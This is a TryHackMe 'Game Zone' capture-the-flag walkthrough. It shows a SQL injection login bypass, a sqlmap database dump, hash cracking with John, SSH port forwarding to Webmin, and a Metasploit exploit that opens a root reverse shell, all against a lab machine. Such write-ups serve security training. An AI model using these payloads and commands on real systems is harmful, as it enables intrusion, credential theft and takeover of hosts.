# Game Zone Walkthrough
<br/>

## Intro
Welcome into the Game Zone challenge write up, [here](https://tryhackme.com/r/room/gamezone) is the link to the room on TryHackMe.
This time we are gonna see SQL injection and use the famous automated tool *sqlmap* to automate a part of the SQL Injection exploitation.
Later on we will use the Metasploit framework to escalate our privileges and retrieve the final flag.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Normally, in every challenge we would start with a port scan with a tool like *nmap*, but here since they already tell us that we have to visit the web-app site, we can directly go to it, as we are gonna play only with this.

Let's navigate to the website at `http://MACHINE_IP`, in the landing page we can notice a picture of the Hitman's game refiguring REDACTED_NAME.
In this page we can also see a login form on the left side, since we know that the room is about SQL injection and we do not have any credentials we can inject `' or 1=1; --` in the username part and leave the password field empty.

This will cause it to return true the first part of the check for the username and exclude the password one, since `--` comments out everything that comes after.

Once logged in we land to the REDACTED page, here we have a form to search for game's reviews.
But what is we can manipulate the backend query function and extract other information from the SQL database?

Now we have a couple of options, we can either try to inject different payloads manually or use an automated tool like *sqlmap* which will to the job for us, finally giving us the option to dump databases.

Let's begin by opening Burp Suite, and capturing with Proxy a test search request, so we can than feed it to sqlmap.
Once you have captured the request copy the entire content, create a new file called `request.txt` and paste all inside and save.

### SQLmap
Now we are finally ready to use our tool, from the directory containing the request file run:
```bash
sqlmap -r request.txt  --dmbs=mysql --dbs --dump
```

This tool always take a bit to complete its work, so sit calmly and keep a look at the terminal output once in a while as it might ask you if proceede or not with certain actions.
Most of the times is fine telling him yes (`y`) but depending on the situation, especially if you have some other insight about the system and exploitable entries you want to put `n` on some of them to speed things up.

After a while we get:
```
Table: users
[1 entry]
+----------------------------------------------------------------------------------+----------+
| pwd                                                                              | username |
+----------------------------------------------------------------------------------+----------+
| REDACTED_HASH                                                                    | agent47  |
+----------------------------------------------------------------------------------+----------+
```

We can also see another table called REDACTED:
```
Table: REDACTED
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

Now we can answer all the task 3 questions and move forward.

<br/>

### Hash Cracking
Since we found a password's hash we can try to crack it using a tool like *JohnTheRipper*, let's save the hash into a file called `hash.txt`
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
```
--> REDACTED

Now we are told to use the username and password found in the database dump to connect via ssh and find the user flag.
We can connect using:
```bash
ssh agent47@MACHINE_IP
```
Provide the password when prompted.

Once connected we can run `ls` and notice a file called `user.txt`, view its content:
```bash
cat user.txt
```


<br/>

### Reverse SSH Tunnels
At this point, in task 5 we are introduced to the concept of **reverse SSH tunneling**, which in this case is simply used to bypass a block imposed to an host, in this scenario our machine is blocked from reaching a service.
Thanks to this strategy we can open a port and forward the traffic from our machine to the SSH connected station which will finally reach the wanted service and allows us to bypass the initial block/filter.

To achieve it, from your machine, run:
```bash
ssh -L 10000:localhost:10000 <username>@<ip>
```

In a real scenario, we would enumerated the machine and network, in fact running a simple command like:
```bash
ss -tulpn
```

would have showed us that the localhost is listening on port 10000, this will arise interest for further investigations.

After running the port forwarding command we can now navigate in our browser to `http://localhost:10000` and login with agent47 credentials.
Here we can see that we are in ==webmin== version: ==1.580== config panel.

<br/>

### Privilege Escalation
In the last task we see this message left for us: "*Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine."*
Looks like we will have to find an exploit for the specific version of the CMS that will grant us access to the machine.

Let's load Metasploit and search for the exploit:
```bash
msfconsole
```
```bash
search webmin 1.580
```

Here we can see 2 options, we chose the first one as it allows command execution:
```bash
use 0
```

Now check which parameters we have to set running `options`:
```bash
set USERNAME agent47
```
```bash
set PASSWORD REDACTED
```

Remove SSL:
```
set SSL false
```

We want to set a payload to give us a reverse shell:
```bash
set payload cmd/unix/reverse
```

You will also need to set the target and the local one (your OpenVPN):
```bash
set RHOSTS 127.0.0.1
```
```bash
set LHOST IP
```

Finally run it:
```
run
```

In a couple of seconds you should have a session established, run `whoami` to confirm you are root and finally get the flag:
```
cat /root/root.txt
```

<br/>

Congratulations you have successfully exploited the game website and practiced with the Metasploit framework to get a reverse shell on the system.

Catch you in the next CTF 😃 
